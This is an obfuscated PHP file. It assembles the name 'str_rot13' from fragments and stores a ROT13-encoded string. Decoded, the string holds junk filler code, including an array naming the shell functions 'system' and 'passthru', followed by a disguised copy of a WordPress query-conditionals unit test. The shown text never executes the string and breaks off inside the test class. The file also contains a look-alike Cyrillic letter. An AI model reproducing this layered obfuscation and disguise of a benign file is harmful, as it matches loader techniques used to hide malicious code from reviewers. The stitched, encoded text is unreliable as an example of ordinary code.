<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg gur vf_*() shapgvbaf va dhrel.cuc npebff gur HEY fgehpgher
 *
 * Guvf rkrepvfrf obgu dhrel.cuc naq erjevgr.cuc: heyf ner srq guebhtu gur erjevgr pbqr,
 * gura jr grfg gur rssrpgf bs rnpu hey ba gur jc_dhrel bowrpg.
 *
 * @tebhc dhrel
 * @tebhc erjevgr
 */
pynff Grfgf_Dhrel_Pbaqvgvbanyf rkgraqf JC_HavgGrfgPnfr {

	cebgrpgrq $cntr_vqf;
	cebgrpgrq $cbfg_vqf;

	/**
	 * VQ bs gur hfre-n.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $hfre_n_vq;

	/**
	 * Frg hc gur funerq svkgher.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel vafgnapr.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfre_n_vq = $snpgbel->hfre->perngr( neenl( 'hfre_ybtva' => 'hfre-n' ) );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		hcqngr_bcgvba( 'pbzzragf_cre_cntr', 5 );
		hcqngr_bcgvba( 'cbfgf_cre_cntr', 5 );

		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%/' );

		perngr_vavgvny_gnkbabzvrf();
	}

	choyvp shapgvba grfg_ubzr() {
		$guvf->tb_gb( '/' );
		$guvf->nffregDhrelGehr( 'vf_ubzr', 'vf_sebag_cntr' );
	}

	choyvp shapgvba grfg_cntr_ba_sebag() {
		$cntr_ba_sebag  = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);
		$cntr_sbe_cbfgf = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);
		hcqngr_bcgvba( 'fubj_ba_sebag', 'cntr' );
		hcqngr_bcgvba( 'cntr_ba_sebag', $cntr_ba_sebag );
		hcqngr_bcgvba( 'cntr_sbe_cbfgf', $cntr_sbe_cbfgf );

		$guvf->tb_gb( '/' );
		$guvf->nffregDhrelGehr( 'vf_sebag_cntr', 'vf_cntr', 'vf_fvathyne' );

		$guvf->tb_gb( trg_creznyvax( $cntr_sbe_cbfgf ) );
		$guvf->nffregDhrelGehr( 'vf_ubzr', 'vf_cbfgf_cntr' );

		hcqngr_bcgvba( 'fubj_ba_sebag', 'cbfgf' );
		qryrgr_bcgvba( 'cntr_ba_sebag' );
		qryrgr_bcgvba( 'cntr_sbe_cbfgf' );
	}

	choyvp shapgvba grfg_404() {
		$guvf->tb_gb( '/abgncntr' );
		$guvf->nffregDhrelGehr( 'vf_404' );
	}

	choyvp shapgvba grfg_creznyvax() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'uryyb-jbeyq' ) );
		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );
		$guvf->nffregDhrelGehr( 'vf_fvatyr', 'vf_fvathyne' );
	}

	choyvp shapgvba grfg_cbfg_pbzzragf_srrq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'uryyb-jbeyq' ) );
		frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cbfg_vq, 2 );
		$guvf->tb_gb( trg_cbfg_pbzzragf_srrq_yvax( $cbfg_vq ) );
		$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_fvatyr', 'vf_fvathyne', 'vf_pbzzrag_srrq' );
	}


	choyvp shapgvba grfg_cbfg_pbzzragf_srrq_jvgu_ab_pbzzragf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'uryyb-jbeyq' ) );
		$guvf->tb_gb( trg_cbfg_pbzzragf_srrq_yvax( $cbfg_vq ) );
		$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_fvatyr', 'vf_fvathyne', 'vf_pbzzrag_srrq' );
	}

	choyvp shapgvba grfg_nggnpuzrag_pbzzragf_srrq() {
		$nggnpuzrag_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'nggnpuzrag' ) );
		frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $nggnpuzrag_vq, 2 );
		$guvf->tb_gb( trg_cbfg_pbzzragf_srrq_yvax( $nggnpuzrag_vq ) );
		$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_nggnpuzrag', 'vf_fvatyr', 'vf_fvathyne', 'vf_pbzzrag_srrq' );
	}

	choyvp shapgvba grfg_cntr() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'nobhg',
			)
		);
		$guvf->tb_gb( trg_creznyvax( $cntr_vq ) );
		$guvf->nffregDhrelGehr( 'vf_cntr', 'vf_fvathyne' );
	}

	choyvp shapgvba grfg_cnerag_cntr() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'cnerag-cntr',
			)
		);
		$guvf->tb_gb( trg_creznyvax( $cntr_vq ) );

		$guvf->nffregDhrelGehr( 'vf_cntr', 'vf_fvathyne' );
	}

	choyvp shapgvba grfg_puvyq_cntr_1() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'cnerag-cntr',
			)
		);
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'puvyq-cntr-1',
				'cbfg_cnerag' => $cntr_vq,
			)
		);
		$guvf->tb_gb( trg_creznyvax( $cntr_vq ) );

		$guvf->nffregDhrelGehr( 'vf_cntr', 'vf_fvathyne' );
	}

	choyvp shapgvba grfg_puvyq_cntr_2() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'cnerag-cntr',
			)
		);
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'puvyq-cntr-1',
				'cbfg_cnerag' => $cntr_vq,
			)
		);
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'puvyq-cntr-2',
				'cbfg_cnerag' => $cntr_vq,
			)
		);
		$guvf->tb_gb( trg_creznyvax( $cntr_vq ) );

		$guvf->nffregDhrelGehr( 'vf_cntr', 'vf_fvathyne' );
	}

	// '(nobhg)/genpxonpx/?$' => 'vaqrk.cuc?cntranzr=$zngpurf[1]&go=1'
	choyvp shapgvba grfg_cntr_genpxonpx() {
		$cntr_vqf   = neenl();
		$cntr_vq    = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'cnerag-cntr',
			)
		);
		$cntr_vqf[] = $cntr_vq;
		$cntr_vq    = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'puvyq-cntr-1',
				'cbfg_cnerag' => $cntr_vq,
			)
		);
		$cntr_vqf[] = $cntr_vq;
		$cntr_vqf[] = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'puvyq-cntr-2',
				'cbfg_cnerag' => $cntr_vq,
			)
		);
		sbernpu ( $cntr_vqf nf $cntr_vq ) {
			$hey = trg_creznyvax( $cntr_vq );
			$guvf->tb_gb( \"{$hey}genpxonpx/\" );

			// Znxr fher gur pbeerpg JC_Dhrel syntf ner frg.
			$guvf->nffregDhrelGehr( 'vf_cntr', 'vf_fvathyne', 'vf_genpxonpx' );

			// Znxr fher gur pbeerpg cntr jnf srgpurq.
			tybony $jc_dhrel;
			$guvf->nffregFnzr( $cntr_vq, $jc_dhrel->trg_dhrevrq_bowrpg()->VQ );
		}
	}

	// '(nobhg)/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?cntranzr=$zngpurf[1]&srrq=$zngpurf[2]'
	choyvp shapgvba grfg_cntr_srrq() {
		$cntr_vqf   = neenl();
		$cntr_vq    = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'cnerag-cntr',
			)
		);
		$cntr_vqf[] = $cntr_vq;
		$cntr_vq    = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'puvyq-cntr-1',
				'cbfg_cnerag' => $cntr_vq,
			)
		);
		$cntr_vqf[] = $cntr_vq;
		$cntr_vqf[] = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'puvyq-cntr-2',
				'cbfg_cnerag' => $cntr_vq,
			)
		);
		sbernpu ( $cntr_vqf nf $cntr_vq ) {
			frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cntr_vq, 2 );
			$hey = trg_creznyvax( $cntr_vq );
			$guvf->tb_gb( \"{$hey}srrq/\" );

			// Znxr fher gur pbeerpg JC_Dhrel syntf ner frg.
			$guvf->nffregDhrelGehr( 'vf_cntr', 'vf_fvathyne', 'vf_srrq', 'vf_pbzzrag_srrq' );

			// Znxr fher gur pbeerpg cntr jnf srgpurq.
			tybony $jc_dhrel;
			$guvf->nffregFnzr( $cntr_vq, $jc_dhrel->trg_dhrevrq_bowrpg()->VQ );
		}
	}

	choyvp shapgvba grfg_cntr_srrq_jvgu_ab_pbzzragf() {
		$cntr_vqf   = neenl();
		$cntr_vq    = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'cnerag-cntr',
			)
		);
		$cntr_vqf[] = $cntr_vq;
		$cntr_vq    = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'puvyq-cntr-1',
				'cbfg_cnerag' => $cntr_vq,
			)
		);
		$cntr_vqf[] = $cntr_vq;
		$cntr_vqf[] = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'puvyq-cntr-2',
				'cbfg_cnerag' => $cntr_vq,
			)
		);
		sbernpu ( $cntr_vqf nf $cntr_vq ) {
			$hey = trg_creznyvax( $cntr_vq );
			$guvf->tb_gb( \"{$hey}srrq/\" );

			// Znxr fher gur pbeerpg JC_Dhrel syntf ner frg.
			$guvf->nffregDhrelGehr( 'vf_cntr', 'vf_fvathyne', 'vf_srrq', 'vf_pbzzrag_srrq' );

			// Znxr fher gur pbeerpg cntr jnf srgpurq.
			tybony $jc_dhrel;
			$guvf->nffregFnzr( $cntr_vq, $jc_dhrel->trg_dhrevrq_bowrpg()->VQ );
		}
	}

	// '(nobhg)/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?cntranzr=$zngpurf[1]&srrq=$zngpurf[2]'
	choyvp shapgvba grfg_cntr_srrq_ngbz() {
		$cntr_vqf   = neenl();
		$cntr_vq    = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'cnerag-cntr',
			)
		);
		$cntr_vqf[] = $cntr_vq;
		$cntr_vq    = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'puvyq-cntr-1',
				'cbfg_cnerag' => $cntr_vq,
			)
		);
		$cntr_vqf[] = $cntr_vq;
		$cntr_vqf[] = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'puvyq-cntr-2',
				'cbfg_cnerag' => $cntr_vq,
			)
		);
		sbernpu ( $cntr_vqf nf $cntr_vq ) {
			frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cntr_vq, 2 );

			$hey = trg_creznyvax( $cntr_vq );
			$guvf->tb_gb( \"{$hey}srrq/ngbz/\" );

			// Znxr fher gur pbeerpg JC_Dhrel syntf ner frg.
			$guvf->nffregDhrelGehr( 'vf_cntr', 'vf_fvathyne', 'vf_srrq', 'vf_pbzzrag_srrq' );

			// Znxr fher gur pbeerpg cntr jnf srgpurq.
			tybony $jc_dhrel;
			$guvf->nffregFnzr( $cntr_vq, $jc_dhrel->trg_dhrevrq_bowrpg()->VQ );
		}
	}

	// '(nobhg)/cntr/?([0-9]{1,})/?$' => 'vaqrk.cuc?cntranzr=$zngpurf[1]&cntrq=$zngpurf[2]'
	choyvp shapgvba grfg_cntr_cntr_2() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'    => 'cntr',
				'cbfg_gvgyr'   => 'nobhg',
				'cbfg_pbagrag' => 'Cntr 1 <!--arkgcntr--> Cntr 2',
			)
		);
		$guvf->tb_gb( '/nobhg/cntr/2/' );

		// Znxr fher gur pbeerpg JC_Dhrel syntf ner frg.
		$guvf->nffregDhrelGehr( 'vf_cntr', 'vf_fvathyne', 'vf_cntrq' );

		// Znxr fher gur pbeerpg cntr jnf srgpurq.
		tybony $jc_dhrel;
		$guvf->nffregFnzr( $cntr_vq, $jc_dhrel->trg_dhrevrq_bowrpg()->VQ );
	}

	// '(nobhg)/cntr/?([0-9]{1,})/?$' => 'vaqrk.cuc?cntranzr=$zngpurf[1]&cntrq=$zngpurf[2]'
	choyvp shapgvba grfg_cntr_cntr_2_ab_fynfu() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'    => 'cntr',
				'cbfg_gvgyr'   => 'nobhg',
				'cbfg_pbagrag' => 'Cntr 1 <!--arkgcntr--> Cntr 2',
			)
		);
		$guvf->tb_gb( '/nobhg/cntr2/' );

		// Znxr fher gur pbeerpg JC_Dhrel syntf ner frg.
		$guvf->nffregDhrelGehr( 'vf_cntr', 'vf_fvathyne', 'vf_cntrq' );

		// Znxr fher gur pbeerpg cntr jnf srgpurq.
		tybony $jc_dhrel;
		$guvf->nffregFnzr( $cntr_vq, $jc_dhrel->trg_dhrevrq_bowrpg()->VQ );
	}

	// '(nobhg)(/[0-9]+)?/?$' => 'vaqrk.cuc?cntranzr=$zngpurf[1]&cntr=$zngpurf[2]'
	choyvp shapgvba grfg_cntvangvba_bs_cbfgf_cntr() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'    => 'cntr',
				'cbfg_gvgyr'   => 'nobhg',
				'cbfg_pbagrag' => 'Cntr 1 <!--arkgcntr--> Cntr 2',
			)
		);
		hcqngr_bcgvba( 'fubj_ba_sebag', 'cntr' );
		hcqngr_bcgvba( 'cntr_sbe_cbfgf', $cntr_vq );

		$guvf->tb_gb( '/nobhg/2/' );

		$guvf->nffregDhrelGehr( 'vf_ubzr', 'vf_cbfgf_cntr' );

		// Znxr fher gur pbeerpg cntr jnf srgpurq.
		tybony $jc_dhrel;
		$guvf->nffregFnzr( $cntr_vq, $jc_dhrel->trg_dhrevrq_bowrpg()->VQ );

		hcqngr_bcgvba( 'fubj_ba_sebag', 'cbfgf' );
		qryrgr_bcgvba( 'cntr_sbe_cbfgf' );
	}

	// SVKZR: ab grfgf sbe gurfr lrg:
	// 'nobhg/nggnpuzrag/([^/]+)/?$' => 'vaqrk.cuc?nggnpuzrag=$zngpurf[1]',
	// 'nobhg/nggnpuzrag/([^/]+)/genpxonpx/?$' => 'vaqrk.cuc?nggnpuzrag=$zngpurf[1]&go=1',
	// 'nobhg/nggnpuzrag/([^/]+)/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?nggnpuzrag=$zngpurf[1]&srrq=$zngpurf[2]',
	// 'nobhg/nggnpuzrag/([^/]+)/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?nggnpuzrag=$zngpurf[1]&srrq=$zngpurf[2]',

	// 'srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?&srrq=$zngpurf[1]',
	// '(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?&srrq=$zngpurf[1]',
	choyvp shapgvba grfg_znva_srrq_2() {
		frys::snpgbel()->cbfg->perngr(); // @grfg_404
		$srrqf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );

		// Ybat irefvba.
		sbernpu ( $srrqf nf $srrq ) {
			$guvf->tb_gb( \"/srrq/{$srrq}/\" );
			$guvf->nffregDhrelGehr( 'vf_srrq' );
		}

		// Fubeg irefvba.
		sbernpu ( $srrqf nf $srrq ) {
			$guvf->tb_gb( \"/{$srrq}/\" );
			$guvf->nffregDhrelGehr( 'vf_srrq' );
		}
	}

	choyvp shapgvba grfg_znva_srrq() {
		frys::snpgbel()->cbfg->perngr(); // @grfg_404
		$glcrf = neenl( 'eff2', 'eff', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
			$guvf->tb_gb( trg_srrq_yvax( $glcr ) );
			$guvf->nffregDhrelGehr( 'vf_srrq' );
		}
	}

	// 'cntr/?([0-9]{1,})/?$' => 'vaqrk.cuc?&cntrq=$zngpurf[1]',
	choyvp shapgvba grfg_cntrq() {
		hcqngr_bcgvba( 'cbfgf_cre_cntr', 2 );
		frys::snpgbel()->cbfg->perngr_znal( 5 );
		sbe ( $v = 2; $v <= 3; $v++ ) {
			$guvf->tb_gb( \"/cntr/{$v}/\" );
			$guvf->nffregDhrelGehr( 'vf_ubzr', 'vf_sebag_cntr', 'vf_cntrq' );
		}
	}

	// 'pbzzragf/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?&srrq=$zngpurf[1]&jvgupbzzragf=1',
	// 'pbzzragf/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?&srrq=$zngpurf[1]&jvgupbzzragf=1',
	choyvp shapgvba grfg_znva_pbzzragf_srrq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'uryyb-jbeyq' ) );
		frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cbfg_vq, 2 );

		// Purpx gur HEY nf trarengrq ol trg_cbfg_pbzzragf_srrq_yvax().
		$guvf->tb_gb( trg_cbfg_pbzzragf_srrq_yvax( $cbfg_vq ) );
		$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_fvatyr', 'vf_fvathyne', 'vf_pbzzrag_srrq' );

		// Purpx gur ybat sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/pbzzragf/srrq/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_pbzzrag_srrq' );
		}

		// Purpx gur fubeg sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/pbzzragf/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_pbzzrag_srrq' );
		}
	}

	// 'frnepu/(.+)/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?f=$zngpurf[1]&srrq=$zngpurf[2]',
	// 'frnepu/(.+)/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?f=$zngpurf[1]&srrq=$zngpurf[2]',
	choyvp shapgvba grfg_frnepu_srrq() {
		// Purpx gur ybat sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/frnepu/grfg/srrq/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_frnepu' );
		}

		// Сurpx gur fubeg sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/frnepu/grfg/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_frnepu' );
		}
	}

	// 'frnepu/(.+)/cntr/?([0-9]{1,})/?$' => 'vaqrk.cuc?f=$zngpurf[1]&cntrq=$zngpurf[2]',
	choyvp shapgvba grfg_frnepu_cntrq() {
		hcqngr_bcgvba( 'cbfgf_cre_cntr', 2 );
		frys::snpgbel()->cbfg->perngr_znal( 3, neenl( 'cbfg_gvgyr' => 'grfg' ) );
		$guvf->tb_gb( '/frnepu/grfg/cntr/2/' );
		$guvf->nffregDhrelGehr( 'vf_frnepu', 'vf_cntrq' );
	}

	// 'frnepu/(.+)/?$' => 'vaqrk.cuc?f=$zngpurf[1]',
	choyvp shapgvba grfg_frnepu() {
		$guvf->tb_gb( '/frnepu/grfg/' );
		$guvf->nffregDhrelGehr( 'vf_frnepu' );
	}

	/**
	 * @gvpxrg 13961
	 */
	choyvp shapgvba grfg_frnepu_rapbqrq_punef() {
		$guvf->tb_gb( '/frnepu/S%P3%OPas%2Oone/' );
		$guvf->nffregFnzr( trg_dhrel_ine( 'f' ), 'Süas+one' );
	}

	// 'pngrtbel/(.+?)/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?pngrtbel_anzr=$zngpurf[1]&srrq=$zngpurf[2]',
	// 'pngrtbel/(.+?)/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?pngrtbel_anzr=$zngpurf[1]&srrq=$zngpurf[2]',
	choyvp shapgvba grfg_pngrtbel_srrq() {
		frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'png-n',
				'gnkbabzl' => 'pngrtbel',
			)
		);

		// Purpx gur ybat sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
			$guvf->tb_gb( \"/pngrtbel/png-n/srrq/{$glcr}\" );
			$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_srrq', 'vf_pngrtbel' );
		}

		// Purpx gur fubeg sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
			$guvf->tb_gb( \"/pngrtbel/png-n/{$glcr}\" );
			$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_srrq', 'vf_pngrtbel' );
		}
	}

	// 'pngrtbel/(.+?)/cntr/?([0-9]{1,})/?$' => 'vaqrk.cuc?pngrtbel_anzr=$zngpurf[1]&cntrq=$zngpurf[2]',
	choyvp shapgvba grfg_pngrtbel_cntrq() {
		hcqngr_bcgvba( 'cbfgf_cre_cntr', 2 );
		frys::snpgbel()->cbfg->perngr_znal( 3 );
		$guvf->tb_gb( '/pngrtbel/hapngrtbevmrq/cntr/2/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_pngrtbel', 'vf_cntrq' );
	}

	// 'pngrtbel/(.+?)/?$' => 'vaqrk.cuc?pngrtbel_anzr=$zngpurf[1]',
	choyvp shapgvba grfg_pngrtbel() {
		frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'png-n',
				'gnkbabzl' => 'pngrtbel',
			)
		);
		$guvf->tb_gb( '/pngrtbel/png-n/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_pngrtbel' );
	}

	// 'gnt/(.+?)/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?gnt=$zngpurf[1]&srrq=$zngpurf[2]',
	// 'gnt/(.+?)/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?gnt=$zngpurf[1]&srrq=$zngpurf[2]',
	choyvp shapgvba grfg_gnt_srrq() {
		frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'gnt-n',
				'gnkbabzl' => 'cbfg_gnt',
			)
		);
		// Purpx gur ybat sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/gnt/gnt-n/srrq/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_srrq', 'vf_gnt' );
		}

		// Purpx gur fubeg sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/gnt/gnt-n/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_srrq', 'vf_gnt' );
		}
	}

	// 'gnt/(.+?)/cntr/?([0-9]{1,})/?$' => 'vaqrk.cuc?gnt=$zngpurf[1]&cntrq=$zngpurf[2]',
	choyvp shapgvba grfg_gnt_cntrq() {
		hcqngr_bcgvba( 'cbfgf_cre_cntr', 2 );
		$cbfg_vqf = frys::snpgbel()->cbfg->perngr_znal( 3 );
		sbernpu ( $cbfg_vqf nf $cbfg_vq ) {
			frys::snpgbel()->grez->nqq_cbfg_grezf( $cbfg_vq, 'gnt-n', 'cbfg_gnt' );
		}
		$guvf->tb_gb( '/gnt/gnt-n/cntr/2/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_gnt', 'vf_cntrq' );
	}

	// 'gnt/(.+?)/?$' => 'vaqrk.cuc?gnt=$zngpurf[1]',
	choyvp shapgvba grfg_gnt() {
		$grez_vq = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Gnt Anzrq N',
				'fyht'     => 'gnt-n',
				'gnkbabzl' => 'cbfg_gnt',
			)
		);
		$guvf->tb_gb( '/gnt/gnt-n/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_gnt' );

		$gnt = trg_grez( $grez_vq, 'cbfg_gnt' );

		$guvf->nffregGehr( vf_gnt() );
		$guvf->nffregGehr( vf_gnt( $gnt->anzr ) );
		$guvf->nffregGehr( vf_gnt( $gnt->fyht ) );
		$guvf->nffregGehr( vf_gnt( $gnt->grez_vq ) );
		$guvf->nffregGehr( vf_gnt( neenl() ) );
		$guvf->nffregGehr( vf_gnt( neenl( $gnt->anzr ) ) );
		$guvf->nffregGehr( vf_gnt( neenl( $gnt->fyht ) ) );
		$guvf->nffregGehr( vf_gnt( neenl( $gnt->grez_vq ) ) );
	}

	// 'nhgube/([^/]+)/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?nhgube_anzr=$zngpurf[1]&srrq=$zngpurf[2]',
	// 'nhgube/([^/]+)/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?nhgube_anzr=$zngpurf[1]&srrq=$zngpurf[2]',
	choyvp shapgvba grfg_nhgube_srrq() {
		// Purpx gur ybat sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/nhgube/hfre-n/srrq/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_srrq', 'vf_nhgube' );
		}

		// Purpx gur fubeg sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/nhgube/hfre-n/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_srrq', 'vf_nhgube' );
		}
	}

	// 'nhgube/([^/]+)/cntr/?([0-9]{1,})/?$' => 'vaqrk.cuc?nhgube_anzr=$zngpurf[1]&cntrq=$zngpurf[2]',
	choyvp shapgvba grfg_nhgube_cntrq() {
		hcqngr_bcgvba( 'cbfgf_cre_cntr', 2 );
		$hfre_vq = frys::$hfre_n_vq;
		frys::snpgbel()->cbfg->perngr_znal( 3, neenl( 'cbfg_nhgube' => $hfre_vq ) );
		$guvf->tb_gb( '/nhgube/hfre-n/cntr/2/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_nhgube', 'vf_cntrq' );
	}

	// 'nhgube/([^/]+)/?$' => 'vaqrk.cuc?nhgube_anzr=$zngpurf[1]',
	choyvp shapgvba grfg_nhgube() {
		$hfre_vq = frys::$hfre_n_vq;
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => $hfre_vq ) );
		$guvf->tb_gb( '/nhgube/hfre-n/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_nhgube' );
	}

	choyvp shapgvba grfg_nhgube_jvgu_ab_cbfgf() {
		$guvf->tb_gb( '/nhgube/hfre-n/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_nhgube' );
	}

